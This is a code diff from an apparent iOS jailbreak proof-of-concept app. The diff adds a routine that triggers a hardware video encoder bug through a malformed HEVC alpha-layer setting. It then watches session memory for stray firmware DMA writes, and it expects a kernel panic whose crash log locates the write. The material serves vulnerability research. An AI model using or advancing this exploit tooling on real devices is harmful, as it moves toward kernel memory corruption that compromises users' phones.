@@ -3242,8 +3242,9 @@ static void runDPrep(void) {
     pocLog(@"║  D-PREP: In-Place Surface Readout         ║");
     pocLog(@"║  Model (b) test — is firmware already     ║");
     pocLog(@"║  writing into our mapped surfaces?        ║");
-    pocLog(@"║  Safe: reads only, keeps session alive    ║");
-    pocLog(@"║  *** MAY PANIC at ~160s (idle timer) ***  ║");
+    pocLog(@"║  *** WILL PANIC ~160s after run ends ***  ║");
+    pocLog(@"║  (invalidation IS a teardown/unmap path   ║");
+    pocLog(@"║   — same as Run A. Keep the .ips!)        ║");
     pocLog(@"╚══════════════════════════════════════════╝");
     pocLog(@"");
 
@@ -3358,9 +3359,14 @@ static void runDPrep(void) {
         return;
     }
 
-    // Step 3b: Scan for ALL IOSurfaces created by the session
-    // VideoToolbox allocates internal output/reference surfaces — find them by ID neighborhood
+    // Step 3b: Scan for IOSurfaces visible to this process
+    // NOTE: encode runs in videocodecd — its DARTMapInternalSurfaces allocations
+    // (bitstream pool, control rings) are in the daemon's namespace and won't appear
+    // in IOSurfaceLookup from this app. This scan only finds app-side external surfaces.
+    // If the stale descriptor targets an internal surface, this scan finds nothing —
+    // that's expected, not a bug. Interpret null accordingly.
     LOG(@"--- STEP 3b: SCAN IOSurface NEIGHBORHOOD ---");
+    LOG(@"(App-visible only — daemon internal surfaces won't appear)");
 
     uint32_t inputSurfID = 0;
     IOSurfaceRef inputSurf = CVPixelBufferGetIOSurface(pb);
@@ -3645,10 +3651,23 @@ static void runDPrep(void) {
         LOG(@"The panic at ~160s is just the mapping going away.");
         os_log(dLog, "JBPoC-DPREP-RESULT MODEL_B_CONFIRMED hits=%d firstAt=%d", hitCount, firstHitTime);
     } else {
-        INFO(@"No surface changes detected in 180s.");
-        INFO(@"Model (a) likely: write is deferred, not continuous.");
-        INFO(@"Proceed to D-proper (re-claim race).");
-        os_log(dLog, "JBPoC-DPREP-RESULT NO_HITS model_a_likely");
+        INFO(@"No changes in input or app-visible surfaces.");
+        INFO(@"*** Does NOT rule out model (b) ***");
+        INFO(@"");
+        INFO(@"Interpretation tree (3 branches):");
+        INFO(@"1. Bytes changed → model (b) confirmed. (didn't happen)");
+        INFO(@"2. No change + fire DVA in EXTERNAL mapping region →");
+        INFO(@"   write is deferred (model a); D-proper needed.");
+        INFO(@"3. No change + Ghidra says target is INTERNAL surface →");
+        INFO(@"   null explained by construction — DARTMapInternalSurfaces");
+        INFO(@"   allocates in videocodecd namespace, invisible to app.");
+        INFO(@"   D-prep can't distinguish (a) vs (b) for internal surfs.");
+        INFO(@"");
+        INFO(@"Check the post-run panic .ips DVA against the external-surface");
+        INFO(@"DVA range to discriminate branches 2 vs 3.");
+        INFO(@"Gating question: Ghidra — which surface index (0-3) does");
+        INFO(@"AXI_ID 0xc0 write to? External or internal?");
+        os_log(dLog, "JBPoC-DPREP-RESULT NO_HITS check_panic_dva_and_ghidra");
     }
     LOG(@"═══════════════════════════════════════════");
 
@@ -3662,8 +3681,13 @@ static void runDPrep(void) {
     [resultStr writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
     INFO(@"Results written to %@", resultPath);
 
-    // Clean up — invalidate to prevent the idle-timer panic
-    LOG(@"Invalidating session to prevent idle-timer panic...");
+    // Clean up — invalidation triggers teardown/unmap, same path as Run A.
+    // This WILL likely panic ~160s later (Run A = panic at 160s after invalidate).
+    // That panic is expected and its .ips is data: the DVA tells you which PTE
+    // the descriptor fired through, confirming the write target was outside the
+    // input region if no input hits were detected above.
+    LOG(@"Invalidating session — EXPECT PANIC ~160s after this.");
+    LOG(@"(Invalidation IS a teardown path. Keep the .ips file!)");
     VTCompressionSessionInvalidate(session);
     CFRelease(session);
     free(snapshot);
@@ -3677,7 +3701,380 @@ static void runDPrep(void) {
 
     g_phase2Running = NO;
 
-    PASS(@"D-PREP complete. Phone should stay up (session invalidated).");
+    PASS(@"D-PREP readout complete. Expect panic in ~160s (same as Run A).");
+    LOG(@"Save the panic .ips — the DVA identifies the write-target surface.");
+}
+
+// ============================================================
+// D-PREP-2: Output-side monitoring via mid-window canary encode
+//
+// D-prep monitors the INPUT surface. But the stale descriptor writes
+// on AXI_ID 0xc0 (encoder WRITE channel) — the target is likely the
+// internal output/bitstream surface. D-prep-2 tests model (b) on
+// the OUTPUT side by submitting a clean encode mid-window on the armed
+// session, retaining the returned CMSampleBuffer, and checksumming the
+// CMBlockBuffer bitstream bytes repeatedly.
+//
+// WARNING: This is Run-B-style session activity — it perturbs the
+// fire timing. Separate sub-run from D-prep, on a fresh boot.
+//
+// Also: invalidation WILL panic. The .ips is data.
+// ============================================================
+
+static volatile BOOL g_dprep2GotOutput = NO;
+static CMSampleBufferRef g_dprep2SampleBuf = NULL;
+
+static void dprep2Callback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    if (status != noErr) {
+        FAIL(@"[D-prep-2] Encode callback error: %d", (int)status);
+        return;
+    }
+    if (sampleBuffer) {
+        g_dprep2GotOutput = YES;
+        CFRetain(sampleBuffer);
+        g_dprep2SampleBuf = sampleBuffer;
+        PASS(@"[D-prep-2] Clean encode output captured");
+    }
+}
+
+static void runDPrep2(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    os_log_t dLog = os_log_create("com.jbpoc.dprep2", "output-readout");
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  D-PREP-2: Output Bitstream Monitoring    ║");
+    pocLog(@"║  Arm → clean encode on same session →     ║");
+    pocLog(@"║  monitor CMBlockBuffer for DMA writes     ║");
+    pocLog(@"║  (Run-B-style: perturbs fire timing!)    ║");
+    pocLog(@"║  *** WILL PANIC ~60-160s after run ***   ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
+    fmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // Step 1: Canary on a throwaway session
+    LOG(@"--- STEP 1: CANARY ---");
+    os_log(dLog, "JBPoC-DPREP2-CANARY-START");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK.");
+    idleWait(5, @"canary cooldown");
+
+    // Step 2: Create armed session (same as D-prep, but we use our own callback)
+    LOG(@"--- STEP 2: ARM Alpha=255 ---");
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        dprep2Callback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        g_phase2Running = NO;
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    // Submit the armed encode (Alpha=255 → -17691)
+    g_dprep2GotOutput = NO;
+    g_dprep2SampleBuf = NULL;
+
+    NSString *armTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"ARM time: %@", armTime);
+    os_log(dLog, "JBPoC-DPREP2-ARM %{public}@", armTime);
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"Armed encode submitted: %d", (int)status);
+
+    // Wait for -17691 timeout
+    LOG(@"Waiting for -17691 encode timeout (up to 130s)...");
+    for (int w = 0; w < 130; w++) {
+        [NSThread sleepForTimeInterval:1.0];
+        if (g_dprep2GotOutput) break;
+        if (w > 0 && w % 30 == 0) {
+            INFO(@"Still waiting for callback... T+%ds", w);
+        }
+    }
+
+    BOOL armed = !g_dprep2GotOutput;
+    INFO(@"Armed: %@ (-17691 = YES)", armed ? @"YES" : @"NO");
+    os_log(dLog, "JBPoC-DPREP2-ARMED %{public}@", armed ? @"YES" : @"NO");
+
+    // Step 3: Submit a CLEAN encode on the same session
+    // This is Run-B-style activity — perturbs fire timing.
+    // The clean encode's output surface may be the same internal surface
+    // the stale descriptor targets (recycled from the session's pool).
+    LOG(@"--- STEP 3: CLEAN ENCODE ON ARMED SESSION ---");
+    LOG(@"(Run-B-style: perturbs timing. Separate experiment from D-prep.)");
+
+    // Clear the AlphaLayerID for a clean encode
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(0));
+    INFO(@"SET AlphaLayerID=0 (clean): %s", status == noErr ? "OK" : "REJECTED");
+
+    CVPixelBufferRef cleanPb = createTestPixelBuffer(320, 240);
+    if (!cleanPb) {
+        FAIL(@"Clean pixel buffer creation failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        CVPixelBufferRelease(pb);
+        g_phase2Running = NO;
+        return;
+    }
+
+    g_dprep2GotOutput = NO;
+    g_dprep2SampleBuf = NULL;
+
+    NSString *cleanTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"Clean encode time: %@", cleanTime);
+    os_log(dLog, "JBPoC-DPREP2-CLEAN-ENCODE %{public}@", cleanTime);
+
+    status = VTCompressionSessionEncodeFrame(session, cleanPb,
+        CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"Clean encode submitted: %d", (int)status);
+
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:3.0];
+
+    CVPixelBufferRelease(cleanPb);
+
+    if (!g_dprep2GotOutput || !g_dprep2SampleBuf) {
+        FAIL(@"Clean encode produced no output — can't monitor bitstream.");
+        LOG(@"Proceeding to readout loop with input surface only.");
+    } else {
+        PASS(@"Clean encode output captured — monitoring bitstream.");
+    }
+
+    // Step 4: Snapshot the output CMBlockBuffer bitstream
+    uint8_t *bitstreamSnapshot = NULL;
+    size_t bitstreamSize = 0;
+
+    if (g_dprep2SampleBuf) {
+        CMBlockBufferRef blockBuf = CMSampleBufferGetDataBuffer(g_dprep2SampleBuf);
+        if (blockBuf) {
+            bitstreamSize = CMBlockBufferGetDataLength(blockBuf);
+            bitstreamSnapshot = (uint8_t *)malloc(bitstreamSize);
+            if (bitstreamSnapshot) {
+                CMBlockBufferCopyDataBytes(blockBuf, 0, bitstreamSize, bitstreamSnapshot);
+                INFO(@"Bitstream snapshot: %zu bytes", bitstreamSize);
+
+                // Show first 32 bytes
+                NSMutableString *hex = [NSMutableString string];
+                for (size_t i = 0; i < bitstreamSize && i < 32; i++) {
+                    [hex appendFormat:@"%02x ", bitstreamSnapshot[i]];
+                }
+                INFO(@"Bitstream head: %@", hex);
+                os_log(dLog, "JBPoC-DPREP2-BITSTREAM size=%zu", bitstreamSize);
+            }
+        }
+    }
+
+    // Also snapshot input pixel buffer for parallel monitoring
+    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+    size_t yH = CVPixelBufferGetHeightOfPlane(pb, 0);
+    size_t yBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
+    size_t ySize = yH * yBpr;
+    size_t uvH = CVPixelBufferGetHeightOfPlane(pb, 1);
+    size_t uvBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
+    size_t uvSize = uvH * uvBpr;
+    size_t inputSize = ySize + uvSize;
+
+    uint8_t *inputSnapshot = (uint8_t *)malloc(inputSize);
+    if (inputSnapshot) {
+        memcpy(inputSnapshot, CVPixelBufferGetBaseAddressOfPlane(pb, 0), ySize);
+        memcpy(inputSnapshot + ySize, CVPixelBufferGetBaseAddressOfPlane(pb, 1), uvSize);
+    }
+    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+
+    // Step 5: READOUT LOOP — monitor bitstream AND input surface every 5s for 180s
+    LOG(@"--- STEP 5: READOUT LOOP (180s, every 5s) ---");
+    LOG(@"Monitoring: bitstream (%zu bytes) + input (%zu bytes)", bitstreamSize, inputSize);
+    os_log(dLog, "JBPoC-DPREP2-READOUT-START bitstream=%zu input=%zu", bitstreamSize, inputSize);
+    pocLog(@"");
+
+    int hitCount = 0;
+    int firstHitTime = -1;
+
+    for (int tick = 1; tick <= 36; tick++) {
+        [NSThread sleepForTimeInterval:5.0];
+
+        int elapsed = tick * 5;
+        NSString *now = [fmt stringFromDate:[NSDate date]];
+
+        // Check bitstream for changes
+        int bsDiffs = 0;
+        int firstBSOff = -1;
+        uint8_t firstBSOld = 0, firstBSNew = 0;
+
+        if (bitstreamSnapshot && g_dprep2SampleBuf) {
+            CMBlockBufferRef blockBuf = CMSampleBufferGetDataBuffer(g_dprep2SampleBuf);
+            if (blockBuf) {
+                size_t curLen = CMBlockBufferGetDataLength(blockBuf);
+                if (curLen == bitstreamSize) {
+                    uint8_t *curBS = (uint8_t *)malloc(bitstreamSize);
+                    if (curBS) {
+                        CMBlockBufferCopyDataBytes(blockBuf, 0, bitstreamSize, curBS);
+                        for (size_t i = 0; i < bitstreamSize; i++) {
+                            if (curBS[i] != bitstreamSnapshot[i]) {
+                                if (bsDiffs == 0) {
+                                    firstBSOff = (int)i;
+                                    firstBSOld = bitstreamSnapshot[i];
+                                    firstBSNew = curBS[i];
+                                }
+                                bsDiffs++;
+                            }
+                        }
+
+                        if (bsDiffs > 0) {
+                            hitCount++;
+                            if (firstHitTime < 0) firstHitTime = elapsed;
+                            PASS(@"*** BITSTREAM HIT at T+%ds (%@) ***", elapsed, now);
+                            LOG(@"  %d bytes changed, first at 0x%x (0x%02x→0x%02x)",
+                                bsDiffs, firstBSOff, firstBSOld, firstBSNew);
+
+                            // Check persistence: is it the same change as last tick?
+                            NSMutableString *hex = [NSMutableString string];
+                            int dumped = 0;
+                            for (size_t i = (size_t)firstBSOff; i < bitstreamSize && dumped < 32; i++) {
+                                if (curBS[i] != bitstreamSnapshot[i]) {
+                                    [hex appendFormat:@"%04zx:%02x→%02x ", i, bitstreamSnapshot[i], curBS[i]];
+                                    dumped++;
+                                }
+                            }
+                            LOG(@"  Bitstream diff: %@", hex);
+
+                            os_log(dLog, "JBPoC-DPREP2-BS-HIT T+%ds diffs=%d first=0x%x",
+                                   elapsed, bsDiffs, firstBSOff);
+
+                            memcpy(bitstreamSnapshot, curBS, bitstreamSize);
+                        }
+                        free(curBS);
+                    }
+                }
+            }
+        }
+
+        // Check input surface for changes
+        int inputDiffs = 0;
+        if (inputSnapshot) {
+            CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+            uint8_t *curY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+            uint8_t *curUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+            for (size_t i = 0; i < ySize; i++) {
+                if (curY[i] != inputSnapshot[i]) inputDiffs++;
+            }
+            for (size_t i = 0; i < uvSize; i++) {
+                if (curUV[i] != inputSnapshot[ySize + i]) inputDiffs++;
+            }
+            if (inputDiffs > 0) {
+                hitCount++;
+                if (firstHitTime < 0) firstHitTime = elapsed;
+                PASS(@"*** INPUT SURFACE HIT at T+%ds: %d bytes ***", elapsed, inputDiffs);
+                memcpy(inputSnapshot, curY, ySize);
+                memcpy(inputSnapshot + ySize, curUV, uvSize);
+            }
+            CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+        }
+
+        if (bsDiffs == 0 && inputDiffs == 0) {
+            if (elapsed <= 30 || elapsed % 30 == 0) {
+                INFO(@"T+%03ds (%@): no change (bitstream + input)", elapsed, now);
+            }
+        }
+    }
+
+    // Step 6: Summary
+    pocLog(@"");
+    LOG(@"═══════════════════════════════════════════");
+    if (hitCount > 0) {
+        PASS(@"*** MODEL (b) CONFIRMED — output-side! ***");
+        LOG(@"DMA writes detected in bitstream or input surface!");
+        LOG(@"Total hits: %d, first at T+%ds", hitCount, firstHitTime);
+        LOG(@"Firmware is writing into session surfaces during window.");
+        os_log(dLog, "JBPoC-DPREP2-RESULT MODEL_B_CONFIRMED hits=%d firstAt=%d", hitCount, firstHitTime);
+    } else {
+        INFO(@"No bitstream or input changes in 180s.");
+        INFO(@"Possible interpretations:");
+        INFO(@"  1. Model (a): write genuinely deferred to teardown");
+        INFO(@"  2. Write targets a surface not returned in CMSampleBuffer");
+        INFO(@"     (control/status surface, or unreturned output buffer)");
+        INFO(@"  3. CMBlockBuffer is a copy — write lands in the original");
+        INFO(@"     IOSurface but the copy is stale");
+        INFO(@"Next: Ghidra surface-index mapping + D-proper re-claim race.");
+        os_log(dLog, "JBPoC-DPREP2-RESULT NO_HITS");
+    }
+    LOG(@"═══════════════════════════════════════════");
+
+    // Write results
+    NSString *resultStr = [NSString stringWithFormat:
+        @"D-PREP-2 RESULT\nDate: %@\nARM: %@\nClean encode: %@\n"
+        @"Bitstream size: %zu\nHits: %d\nFirst hit: T+%ds\n",
+        [NSDate date], armTime, cleanTime,
+        bitstreamSize, hitCount, firstHitTime];
+    NSString *resultPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/dprep2_result.txt"];
+    [resultStr writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    INFO(@"Results written to %@", resultPath);
+
+    // Cleanup — WILL PANIC
+    LOG(@"Invalidating session — EXPECT PANIC ~60-160s after this.");
+    LOG(@"(Clean encode may have shortened the window via Run-B path.)");
+    LOG(@"Keep the .ips file!");
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    CVPixelBufferRelease(pb);
+    if (bitstreamSnapshot) free(bitstreamSnapshot);
+    if (inputSnapshot) free(inputSnapshot);
+    if (g_dprep2SampleBuf) {
+        CFRelease(g_dprep2SampleBuf);
+        g_dprep2SampleBuf = NULL;
+    }
+    g_phase2Running = NO;
+
+    PASS(@"D-PREP-2 readout complete. Expect panic in ~60-160s.");
+    LOG(@"Shorter window than D-prep because clean encode triggers");
+    LOG(@"AVE_EncodeCycle_Cleanup → ReleaseAllDelayed (Run B path).");
 }
 
 // ============================================================
@@ -4220,17 +4617,31 @@ static void runTier2Probe(void) {
     // D-prep button — row 9: in-place surface readout (Model b test)
     CGFloat row9 = row8 + btnH + gap;
 
+    CGFloat dBtnW = (w - pad * 2 - gap) / 2;
+
     UIButton *dPrepBtn = [UIButton buttonWithType:UIButtonTypeSystem];
-    dPrepBtn.frame = CGRectMake(pad, row9, w - pad * 2, btnH);
+    dPrepBtn.frame = CGRectMake(pad, row9, dBtnW, btnH);
     dPrepBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.3 blue:0.5 alpha:1];
     dPrepBtn.layer.cornerRadius = 8;
     dPrepBtn.layer.borderWidth = 2;
     dPrepBtn.layer.borderColor = [UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1].CGColor;
-    dPrepBtn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
-    [dPrepBtn setTitle:@"D-Prep: Surface Readout (Model b)" forState:UIControlStateNormal];
+    dPrepBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [dPrepBtn setTitle:@"D-Prep: Input" forState:UIControlStateNormal];
     [dPrepBtn setTitleColor:[UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1] forState:UIControlStateNormal];
     [dPrepBtn addTarget:self action:@selector(runDPrep) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:dPrepBtn];
+
+    UIButton *dPrep2Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    dPrep2Btn.frame = CGRectMake(pad + dBtnW + gap, row9, dBtnW, btnH);
+    dPrep2Btn.backgroundColor = [UIColor colorWithRed:0.0 green:0.2 blue:0.5 alpha:1];
+    dPrep2Btn.layer.cornerRadius = 8;
+    dPrep2Btn.layer.borderWidth = 2;
+    dPrep2Btn.layer.borderColor = [UIColor colorWithRed:0.3 green:0.6 blue:1.0 alpha:1].CGColor;
+    dPrep2Btn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
+    [dPrep2Btn setTitle:@"D-Prep-2: Output" forState:UIControlStateNormal];
+    [dPrep2Btn setTitleColor:[UIColor colorWithRed:0.3 green:0.6 blue:1.0 alpha:1] forState:UIControlStateNormal];
+    [dPrep2Btn addTarget:self action:@selector(runDPrep2) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:dPrep2Btn];
 
     CGFloat logTop = row9 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
@@ -4356,6 +4767,12 @@ static void runTier2Probe(void) {
 - (void)runDPrep {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runDPrep();
+    });
+}
+
+- (void)runDPrep2 {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runDPrep2();
     });
 }
 
